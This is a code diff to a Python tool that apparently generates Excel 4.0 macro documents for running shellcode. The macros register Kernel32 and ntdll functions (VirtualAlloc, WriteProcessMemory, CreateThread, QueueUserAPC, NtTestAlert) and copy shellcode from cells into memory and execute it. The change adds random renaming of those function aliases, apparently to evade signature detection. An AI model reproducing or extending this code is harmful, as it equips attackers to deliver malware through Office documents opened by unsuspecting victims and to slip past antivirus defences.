@@ -132,6 +132,13 @@ def mangle_word(word):
         counter = counter + 1
     return assemble
 
+# Generate Random VariName
+def generate_random_string(stringToRandomize):
+    length = random.randint(2, len(stringToRandomize)+2)
+    letters = string.ascii_letters  # + string.digits
+    return ''.join([random.choice(letters) for _ in range(length)])
+
+
 def chunks(s, n):
 	"""
 	Author: HarmJ0y, borrowed from Empire
@@ -351,7 +358,7 @@ def generateClearInstructions(args, x86Size, x64Size, x86Count, x64Count):
 
 		
 	#A1 Style
-	columnAList.append('=REGISTER("Kernel32",mangle_word("VirtualAlloc"),"JJJJJ","Valloc",,1,9)\r\n')
+	columnAList.append('=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)\r\n')
 	columnAList.append('=REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)\r\n')
 	columnAList.append('=REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)\r\n')
 	columnAList.append('=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(' + mainCol + '10),GOTO(' + mainCol + '21))\r\n')
@@ -429,46 +436,53 @@ def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64C
 		columnAList.append('=GOTO(R5C' + cols['actionColR1'] + ')\r\n')
 		columnAList.append('=GOTO(R6C' + cols['actionColR1'] + ')\r\n')
 
-		
+	#Method Name Obfuscation
+	Valloc=generate_random_string("Valloc")
+	WProcessMemory=generate_random_string("WProcessMemory")
+	CThread=generate_random_string("CThread")
+	RTL=generate_random_string("RTL")
+	Queue=generate_random_string("Queue")
+	Go=generate_random_string("Go")
+
 	#R1C1 Style (required for obfuscated =FORMULA() function)
-	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("VirtualAlloc")+',"JJJJJ","Valloc",,1,9)\r\n')
-	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("WriteProcessMemory")+',"JJJCJJ","WProcessMemory",,1,9)\r\n')
-	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("CreateThread")+',"JJJJJJJ","CThread",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("VirtualAlloc")+',"JJJJJ","'+Valloc+'",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("WriteProcessMemory")+',"JJJCJJ","'+WProcessMemory+'",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("CreateThread")+',"JJJJJJJ","'+CThread+'",,1,9)\r\n')
 	columnAList.append('=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R10C' + cols['actionColR1'] + '),GOTO(R21C' + cols['actionColR1'] + '))\r\n')
 	
 	#32-bit valloc + shellcode selection
-	columnAList.append('=Valloc(0,' + str(x86Size) + ',4096,64)\r\n')
+	columnAList.append('='+Valloc+'(0,' + str(x86Size) + ',4096,64)\r\n')
 	columnAList.append('main=R1C' + cols['x86ColR1'] + '\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
 	columnAList.append('=WHILE(main<>"excel")\r\n')
 	columnAList.append('=SET.VALUE(R2C' + cols['trackingColR1'] + ',LEN(main))\r\n')
-	columnAList.append('=WProcessMemory(-1,R10C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*255),main,LEN(main),0)\r\n')
+	columnAList.append('='+WProcessMemory+'(-1,R10C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*255),main,LEN(main),0)\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',R1C' + cols['trackingColR1'] + '+1)\r\n')
 	columnAList.append('main=ABSREF("R[1]C",main)\r\n')
 	columnAList.append('=NEXT()\r\n')
-	columnAList.append('=CThread(0,0,R10C' + cols['actionColR1'] + ',0,0,0)\r\n')
+	columnAList.append('='+CThread+'(0,0,R10C' + cols['actionColR1'] + ',0,0,0)\r\n')
 	columnAList.append('=HALT()\r\n')
 	
 	#64-bit valloc + shellcode selection
 	columnAList.append('1342177280\r\n')
 	columnAList.append('0\r\n')
 	columnAList.append('=WHILE(R22C' + cols['actionColR1'] + '=0)\r\n')
-	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',Valloc(R21C' + cols['actionColR1'] + ',' + str(x64Size) + ',12288,64))\r\n')
+	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ','+Valloc+'(R21C' + cols['actionColR1'] + ',' + str(x64Size) + ',12288,64))\r\n')
 	columnAList.append('=SET.VALUE(R21C' + cols['actionColR1'] + ',R21C' + cols['actionColR1'] + '+262144)\r\n')
 	columnAList.append('=NEXT()\r\n')
-	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("RtlCopyMemory")+',"JJCJ","RTL",,1,9)\r\n')
-	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("QueueUserAPC")+',"JJJJ","Queue",,1,9)\r\n')
-	columnAList.append('=REGISTER('+mangle_word("ntdll")+','+mangle_word("NtTestAlert")+',"J","Go",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("RtlCopyMemory")+',"JJCJ","'+RTL+'",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("QueueUserAPC")+',"JJJJ","'+Queue+'",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("ntdll")+','+mangle_word("NtTestAlert")+',"J","'+Go+'",,1,9)\r\n')
 	columnAList.append('main=R1C' + cols['x64ColR1'] + '\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
 	columnAList.append('=WHILE(main<>"EXCEL")\r\n')
 	columnAList.append('=SET.VALUE(R2C' + cols['trackingColR1'] + ',LEN(main))\r\n')
-	columnAList.append('=RTL(R22C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*10),main,LEN(main))\r\n')
+	columnAList.append('='+RTL+'(R22C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*10),main,LEN(main))\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',R1C' + cols['trackingColR1'] + '+1)\r\n')
 	columnAList.append('main=ABSREF("R[1]C",main)\r\n')
 	columnAList.append('=NEXT()\r\n')
-	columnAList.append('=Queue(R22C' + cols['actionColR1'] + ',-2,0)\r\n')
-	columnAList.append('=Go()\r\n')
+	columnAList.append('='+Queue+'(R22C' + cols['actionColR1'] + ',-2,0)\r\n')
+	columnAList.append('='+Go+'()\r\n')
 	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',0)\r\n')
 	columnAList.append('=HALT()\r\n')
 	
